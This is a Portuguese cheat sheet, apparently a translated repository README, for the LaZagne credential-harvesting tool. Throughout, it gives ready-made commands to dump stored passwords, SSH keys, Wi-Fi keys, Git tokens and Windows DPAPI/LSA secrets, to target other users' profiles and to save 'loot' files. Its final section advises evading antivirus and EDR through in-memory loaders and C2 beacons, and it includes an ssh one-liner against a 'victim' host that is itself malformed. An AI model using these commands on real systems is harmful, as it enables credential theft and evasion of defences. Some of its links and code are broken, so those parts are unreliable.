<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Folha de dicas do LaZagne

[LaZagne](https://github.com/AlessandroZ/LaZagne) é um aplicativo pós-exploração de código aberto usado para recuperar senhas armazenadas em um computador local. Ele oferece suporte a Windows, Linux e macOS em várias categorias, incluindo navegadores da web, clientes de e-mail, redes Wi-Fi, software de gerenciamento de banco de dados, ferramentas de administração de sistemas e caches de memória.

---

## Índice

- [Módulos e categorias suportados](#módulos suportados--categorias)
- [Instalação e binários](#instalação--binários)
- [Coleta de credenciais Linux](#linux-credential-harvesting)
- [Coleta de credenciais do Windows](#colheita de credenciais do Windows)
- [Ataques de categoria direcionada](#ataques de categoria direcionada)
- [Formatos de saída e exportação de arquivo](#output-formats--file-export)
- [Segurança operacional e prevenção de EDR](#operacional-segurança--edr-evitar)

---

## Módulos e categorias suportados

LaZagne extrai credenciais de dezenas de aplicativos agrupados em categorias:
- **Navegadores:** Chrome, Firefox, Edge, Opera, Brave, Chromium (histórico, preenchimento automático, cookies, credenciais).
- **Ferramentas de administração de sistemas:** WinSCP, PuTTY, OpenSSH (chaves/configuração `id_rsa`), RDP/mstsc, FileZilla, Cyberduck, VNC.
- **Bancos de dados:** DBeaver, pgAdmin, Squirrel, Robomongo, SQL Server Management Studio.
- **Wi-Fi:** Chaves pré-compartilhadas WPA2/WPA3 (PSK) armazenadas em perfis de rede do sistema operacional.
- **Desenvolvedor e VCS:** credenciais Git (`.git-credentials`, cache), SVN, tokens Docker, credenciais AWS CLI.
- **E-mail e bate-papo:** Thunderbird, Outlook, Pidgin, Skype.
- **Windows Vault e DPAPI:** segredos LSA, chaves mestras DPAPI, itens do cofre do Credential Manager.

---

## Instalação e binários
```bash
# Clone the repository
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne

# Install Python dependencies (for running source on Linux)
pip install -r requirements.txt

# Or download pre-compiled standalone binaries (releases page)
# Windows: lazagne.exe
# Linux: laZagne.py
```
---

## Coleta de credenciais do Linux

### 1. Execute todos os módulos de extração
```bash
python3 laZagne.py all
```
### 2. Execute com privilégios Root / Sudo (expande o acesso Shadow e Keyring)
Executar como `root` desbloqueia segredos do sistema, perfis Wi-Fi em `/etc/NetworkManager` e chaves SSH em todos os diretórios `/home/*`:
```bash
sudo python3 laZagne.py all
```
### 3. Extraia senhas do Gnome Keyring / KWallet
```bash
python3 laZagne.py sysadmin -k
```
---

## Coleta de credenciais do Windows

No Windows, use o executável independente `lazagne.exe`:

### 1. Extraia todas as senhas armazenadas
```cmd
lazagne.exe all
```
### 2. Execute com privilégios elevados (Admin / SYSTEM)
Extraia chaves mestras DPAPI, segredos LSA e credenciais de domínio em cache:
```cmd
lazagne.exe all -v
```
### 3. Extraia senhas para um usuário específico (ao executar como administrador)
```cmd
lazagne.exe all -path "C:\Users\TargetUser\AppData"
```
---

## Ataques de categoria direcionada

Em vez de executar todos os módulos, especifique categorias de software de destino para minimizar a atividade e o ruído do disco:

### 1. Somente navegadores da Web
```bash
# Linux
python3 laZagne.py browsers

# Windows
lazagne.exe browsers
```
### 2. Senhas de texto não criptografado de Wi-Fi
```bash
# Linux (requires root or sudo)
sudo python3 laZagne.py wifi

# Windows
lazagne.exe wifi
```
### 3. Ferramentas de administração de sistemas e acesso remoto (SSH, RDP, WinSCP, FileZilla)
```bash
# Linux
python3 laZagne.py sysadmin

# Windows
lazagne.exe sysadmin
```
### 4. Clientes de banco de dados
```bash
# Linux
python3 laZagne.py databases

# Windows
lazagne.exe databases
```
### 5. Credenciais de desenvolvedor e Git
```bash
# Linux
python3 laZagne.py git
```
---

## Formatos de saída e exportação de arquivos

Salve as credenciais coletadas diretamente no disco em formatos estruturados:

### Exportar para formato JSON
```bash
python3 laZagne.py all -oJ -oN /tmp/loot_credentials
```
Cria `/tmp/loot_credentials.json` contendo credenciais estruturadas, URLs, nomes de usuário e senhas em texto simples.

### Exportar para texto simples
```bash
python3 laZagne.py all -oT -oN /tmp/loot_credentials
```
Cria `/tmp/loot_credentials.txt`.

---

## Segurança operacional e prevenção de EDR

- **Detecção de antivírus:** O `lazagne.exe` independente é fortemente assinado pelo Windows Defender e por soluções comerciais de EDR.
- **Ofuscação e execução na memória:**
  - Execute via reflexão do PowerShell ou carregadores na memória (`donut`, `execute-assembly` em Cobalt Strike/Sliver).
  - Use a versão fonte do Python com um ambiente virtual personalizado em vez do binário PyInstaller compactado.
- **Limpar artefatos:** Exclua arquivos de saque temporários ou redirecione a saída diretamente por meio de saída padrão em um beacon C2 criptografado ou sessão SSH:
  ```bash
  ssh victim@192.168.1.50 'python3 -' < laZagne.py all
  ```